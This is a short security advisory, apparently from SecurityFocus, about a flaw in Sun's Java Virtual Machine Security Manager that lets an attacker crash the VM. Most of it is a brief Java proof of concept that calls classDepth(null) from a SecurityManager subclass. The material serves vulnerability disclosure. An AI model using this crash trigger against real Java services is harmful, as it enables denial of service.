source: http://www.securityfocus.com/bid/8892/info

A problem has been reported in the Sun Microsystems Java Virtual Machine that occurs when implementing the Security Manager. Because of this, an attacker may be able to crash the virtual machine. 

/* InsecurityManager-Demonstration */
/* coded by Marc Schoenefeld */
public class InSecurityManager extends SecurityManager {

public void doit() {
System.out.println("doit");
int o = classDepth(null);
}

public static void main(String[] a) {
InSecurityManager m = new InSecurityManager();
m.doit();
}
} 